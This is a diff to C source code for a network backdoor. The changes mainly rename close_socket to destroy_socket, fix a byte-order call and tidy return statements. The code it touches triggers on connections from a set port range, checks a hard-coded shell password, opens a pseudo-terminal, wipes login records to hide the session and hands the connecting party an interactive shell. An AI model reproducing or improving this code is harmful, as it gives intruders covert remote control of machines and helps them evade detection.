@@ -20,7 +20,7 @@
 
 /** Compatibility note
  * Platform              Header              Library
- * 
+ *
  * Cygwin                <pty.h>             libc
  * Interix               <pty.h>             libc
  * OSF/1 4 and 5         <pty.h>             libc
@@ -29,10 +29,13 @@
  * OpenBSD, NetBSD       <util.h>            libutil
  * FreeBSD               <libutil.h>         libutil
  */
+
 #include <unistd.h> /* read(), close(), ... */
 #include <string.h> /* memset(), strncmp() */
 #include <stdint.h> /* size_t */
-#if (defined(__APPLE__) && defined(__MACH__)) || defined(__OpenBSD__) || defined(__NetBSD__)
+
+#if (defined(__APPLE__) && defined(__MACH__)) || \
+    defined(__OpenBSD__) || defined(__NetBSD__)
 # include <util.h> /* openpty() */
 #elif defined(__FreeBSD__)
 # include <libutil.h> /* openpty() */
@@ -40,9 +43,10 @@
 #else
 # include <pty.h> /* openpty() */
 #endif
+
 #include <sys/ioctl.h> /* ioctl */
 #include <errno.h> /* errno globale */
-#include <arpa/inet.h> /* htons() */
+#include <arpa/inet.h> /* ntohs() */
 #include <sys/socket.h> /* struct sockaddr */
 #include <sys/select.h> /* select() */
 #include <libgen.h> /* basename() */
@@ -78,15 +82,15 @@ static int  check_shell_password(int sock) {
 
     if (i != strlen(SHELL_PASSWORD) + 1
         || strncmp(buffer, SHELL_PASSWORD, strlen(SHELL_PASSWORD)) != 0)
-        return (-1);
-    return (1);
+        return -1;
+    return 1;
 }
 
 
-/** close backdoor socket properly and return -1
+/** destroy backdoor socket properly and return -1
  * WARNING: this also shutdowns the socket stream
  */
-static int  close_socket(int sock) {
+static int  destroy_socket(int sock) {
     shutdown(sock, SHUT_RDWR);
     close(sock);
     return (-1);
@@ -155,7 +159,7 @@ static void shell_loop(int sock, int pty) {
                     DEBUG(D_ERROR, "shell_loop(): couldn't read from client: %s",
                         strerror(errno));
                 close(pty);
-                close_socket(sock);
+                destroy_socket(sock);
                 exit(1);
             }
             else
@@ -168,7 +172,7 @@ static void shell_loop(int sock, int pty) {
                     DEBUG(D_ERROR, "shell_loop(): couldn't read from pty: %s",
                         strerror(errno));
                 close(pty);
-                close_socket(sock);
+                destroy_socket(sock);
                 exit(1);
             }
             else
@@ -185,12 +189,12 @@ static int  drop_pty_connection(int sock) {
     DEBUG(D_INFO, "drop_pty_connection() called");
 
     int     pty, tty;
-    char    pty_name[4 + 255 + 1]; // "/dev/" + MAX_NAME_SZ + "\0"
+    char    pty_name[5 + 255 + 1]; // "/dev/" + MAX_NAME_SZ + "\0"
 
     /* open a pty and cleanup log entries */
     if (openpty(&pty, &tty, pty_name, NULL, NULL) < 0) {
         DEBUG(D_ERROR, "openpty(): %s", strerror(errno));
-        return (close_socket(sock));
+        return destroy_socket(sock);
     }
     DEBUG(D_INFO, "pty_name = '%s'", pty_name);
     cleanup_login_records(basename(pty_name));
@@ -201,9 +205,9 @@ static int  drop_pty_connection(int sock) {
             start_interactive_shell(sock, &pty, &tty);
         case -1:
             DEBUG(D_ERROR, "fork(): %s", strerror(errno));
-            close_socket(sock);
+            destroy_socket(sock);
             close(tty);
-            return (-1);
+            return -1;
         default:
             close(tty);
     }
@@ -218,7 +222,7 @@ static int  drop_pty_connection(int sock) {
             close(sock);
             close(pty);
             errno = ECONNABORTED;
-            return (-1);
+            return -1;
     }
 }
 
@@ -235,17 +239,17 @@ int         drop_shell_backdoor(int sock, struct sockaddr *addr) {
     uint16_t sin_port;
 
     sa_in = (struct sockaddr_in*) addr;
-    sin_port = htons(sa_in->sin_port);
+    sin_port = ntohs(sa_in->sin_port);
 
     if (sin_port < LOW_BACKDOOR_PORT || sin_port > HIGH_BACKDOOR_PORT)
         return sock;
 
     if (check_shell_password(sock) < 0)
-        return (close_socket(sock));
+        return destroy_socket(sock);
 
     if ((dprintf(sock, "\r\n%s\r\n", SHELL_MOTD)) < 0) {
         DEBUG(D_ERROR, "write(): %s", strerror(errno));
-        return (close_socket(sock));
+        return destroy_socket(sock);
     }
 
     return drop_pty_connection(sock);
